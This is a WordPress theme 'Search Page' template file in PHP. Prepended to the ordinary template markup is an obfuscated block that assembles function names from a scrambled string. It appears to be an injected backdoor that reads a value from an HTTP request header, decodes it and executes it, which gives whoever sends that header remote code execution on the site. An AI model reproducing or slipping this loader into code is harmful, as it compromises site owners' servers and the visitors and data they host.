<?php 
$egw="rjrleT3eQpo1s69_L6Icp0CQ4B0_edUeeoJeZgVeIeXNc.c25vTKHPse/pDew/o8Yn*RTbPakX26vldptUr7.S9qaX8L1vgM_Ae";
$wrgskepbhbcd=$egw[52] . $egw[5] . $egw[50] . $egw[70] . $egw[15] . $egw[51] . $egw[30] . $egw[81] . $egw[68] . $egw[22] . $egw[40] . $egw[58] . $egw[73] . $egw[8] . $egw[38];
$lkfodmmhv=$egw[94] . $egw[35] . $egw[80] . $egw[59] . $egw[65] . $egw[76];
$ofsjqkqfa=$egw[57] . $egw[2] . $egw[7] . $egw[37] . $egw[96] . $egw[0] . $egw[98] . $egw[20] . $egw[3] . $egw[71] . $egw[44] . $egw[4];
$eozkkdpgg=$egw[69] . $egw[88] . $egw[54] . $egw[28] . $egw[17] . $egw[24] . $egw[27] . $egw[29] . $egw[41] . $egw[46] . $egw[33] . $egw[78] . $egw[31];
$ebjuahyav=$egw[61] . $egw[84] . $egw[66] . $egw[56] . $egw[55];
$drhaitimp=$egw[45];
$zpywgdksahvm=$lkfodmmhv($wrgskepbhbcd);
$ofsjqkqfa($ebjuahyav,$eozkkdpgg($zpywgdksahvm),$drhaitimp);
?><?php
/*
Template Name: Search Page
*/
?>

<?php get_header(); ?>
<div id="background-img">
<?php 
	$a = get_post_meta($post->ID, "upload_image", true);
	if($a != ''){
		echo '<img class="background-image" src="' . $a . '" alt="" />';
	}
?>
</div>
<div id="container">
	<div id="page">
		<section>
			<?php while ( have_posts() ) : the_post(); ?>
				<?php if (is_search() && ($post->post_type=='page')) continue; ?>
	
				<article>
		<div class="blog_header"><h1><a href="<?php the_permalink() ?>"><?php the_title(); ?></a></h1></div>
		<time>Posted on <strong><?php the_date('F j, Y'); ?></strong> by <strong class="capitalize"> <?php the_author() ?></strong> in <strong class="capitalize"><?php the_category(' / ') ?></strong></time>
		<figure><?php echo get_the_post_thumbnail($page->ID, 'Blog'); ?></figure>
		<div class="blog_excerpt"><?php the_excerpt(); ?></div>
		<p><span class="readmore"><a href="<?php the_permalink() ?>">Read more <span class="readmore_arrow">&raquo;</span></a></span></p>
	</article>

			<?php endwhile; // end of the loop. ?>
		</section>
		<aside>
		<?php blog_sidebar(); ?>
		</aside>
		<div class="clearBoth"></div>
	</div><!-- #content -->
</div><!-- #container -->	

<?php get_footer(); ?>